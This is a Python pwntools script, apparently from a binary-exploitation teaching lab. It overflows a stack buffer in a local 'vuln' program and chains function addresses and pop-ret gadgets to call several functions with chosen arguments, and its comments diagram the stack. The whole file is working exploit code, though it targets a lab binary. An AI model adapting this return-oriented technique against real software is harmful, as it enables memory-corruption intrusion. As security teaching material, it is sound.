#!/usr/bin/env python3

from pwn import *

# Print byte array as hex string "\x..\x..\x.."
def print_byte_array(prefix, array):
    log.info("{}: {}".format(prefix, "".join("\\x{:02x}".format(array[i]) for i in range(0, len(array)))))


# Change to 'debug' for extensive information on classes used.
context.log_level = 'info'

filename = "../src/vuln"
e = ELF(filename)
context.binary = filename
diablo_address = e.symbols[b"diablo"]
overwatch_address = e.symbols[b"overwatch"]
warcraft_address = e.symbols[b"warcraft"]
starcraft_address = e.symbols[b"starcraft"]
starcraft_inner_address = 0x08048519
pop_ret_gadget_address = 0x08048331
pop_pop_ret_gadget_address = 0x080485ea

print("diablo: 0x{:08x}".format(diablo_address))
print("warcraft: 0x{:08x}".format(warcraft_address))
print("overwatch: 0x{:08x}".format(overwatch_address))
print("starcraft: 0x{:08x}".format(starcraft_address))

# buffer is at ebp-0x40
# return address is at ebp+0x4
offset = 0x44
#payload = offset * b"A" + pack(warcraft_address)
#payload = offset * b"A" + pack(overwatch_address) + pack(pop_ret_gadget_address) + pack(0xdeadbeef) + pack(warcraft_address)
payload = offset * b"A" + pack(diablo_address) + pack(pop_pop_ret_gadget_address) + pack(0x12345678) + pack(0xaabbccdd) + pack(overwatch_address) + pack(pop_ret_gadget_address) + pack(0xdeadbeef) + pack(warcraft_address)

"""
low address

------
buffer
.....
.....
------
old ebp
------
overwatch_address
------ top_of_stack_at_the_beginning_of_overwatch
pop_ret_gadget_address                     ------------>    pop edi     ret
------ top_of_the_stack_at_the_beginning_of_warcraft
expected_1st_argument
------
warcraft_address

high address

ret <===> call [esp]; pop



                push 3rd arg
                push 2nd arg
                push 1st arg
                call f -> save next_instruction_address (store the return_address) - push eip
                       -> jmp f
"""

print_byte_array("payload", payload)

p = process(filename)
p.readline()
p.sendline(payload)
p.interactive()
